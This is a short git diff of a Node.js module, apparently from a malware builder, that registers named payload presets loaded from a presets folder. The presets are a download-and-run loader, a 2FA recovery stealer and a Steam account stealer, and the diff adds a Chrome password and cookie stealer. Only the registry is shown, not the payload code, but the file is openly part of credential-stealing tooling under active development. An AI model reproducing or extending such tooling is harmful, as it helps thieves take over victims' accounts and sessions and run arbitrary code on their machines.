@@ -5,4 +5,5 @@ module.exports = {
     download_and_run_file: fs.readFileSync(__dirname + '/./presets/download_and_run_file.js', 'utf8'),
     cosmic_2fa_recovery_stealer: fs.readFileSync(__dirname + '/./presets/cosmic_2fa_recovery_stealer.js', 'utf8'),
     steam_account_stealer: fs.readFileSync(__dirname + '/./presets/steam_account_stealer.js', 'utf8'),
+    chrome_password_and_cookie_stealer: fs.readFileSync(__dirname + '/./presets/chrome_password_and_cookie_stealer.js', 'utf8'),
 };
